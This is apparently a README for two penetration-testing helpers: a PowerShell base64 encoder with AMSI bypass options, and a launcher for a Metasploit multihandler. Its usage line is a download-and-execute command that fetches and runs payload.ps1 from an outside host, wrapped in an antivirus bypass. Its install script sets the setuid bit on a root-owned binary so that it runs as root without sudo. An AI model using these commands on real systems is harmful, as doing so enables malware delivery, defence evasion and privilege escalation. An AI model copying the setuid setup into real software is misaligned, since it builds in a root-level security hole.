#AMSIb64.ps1

A powershell b64 converter with options to add AMSI bypasses.

## Usage

powershell AMSIb64.ps1 -amsi context -c 'IEX (New-Object Net.Webclient).downloadstring("http://192.168.49.101/payload.ps1")'

# msf
A shortcut to starting an msfconsole with the multihandler already setup. Accepts a port. runs with root priveleges without sudo.

## Install

chmod +x ./msfsetup.sh
sudo ./msfsetup.sh

if /opt isn't in your path, then add it or have script move msf somewhere that is. 

### Option 1: Adding /opt to path
echo 'export PATH="$PATH:/opt" > ~/.bashrc'

### Option 2: changing install script to place in path

#!/bin/bash
```
chmod +x msf
chmod +s msf

mv ./msf /bin/msf
chown root:root /bin/msf
```



